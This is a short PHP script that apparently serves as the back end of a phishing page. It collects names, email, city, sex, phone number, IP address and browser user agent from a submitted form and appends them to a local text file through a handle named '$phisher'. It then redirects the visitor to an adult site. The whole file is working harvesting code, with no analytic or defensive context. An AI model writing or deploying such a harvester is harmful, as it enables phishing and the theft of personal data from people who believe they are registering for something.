<?php
$first=$_POST['firstname'];
$second =$_POST['secondname'];
$email=$_POST['email'];
$state=$_POST['City'];
$sex=$_POST['sex'];
$phone=$_POST['phone'];
$ip = $_SERVER['REMOTE_ADDR'];

$aaa = $_SERVER['HTTP_USER_AGENT'];
$gdate = getdate();
$y = $gdate['year'];
$m = $gdate['mon'];
$d = $gdate['mday'];
$time = "$d-$m-$y";
$phisher = fopen("register.txt","a");
fwrite($phisher,$ip.":".$time.":".$first.":".$second.":".$email.":".$state.":".$sex.":".$phone.":".$aaa.":");
fclose($phisher);
header("Location:http://www.xnxx.com/");
?>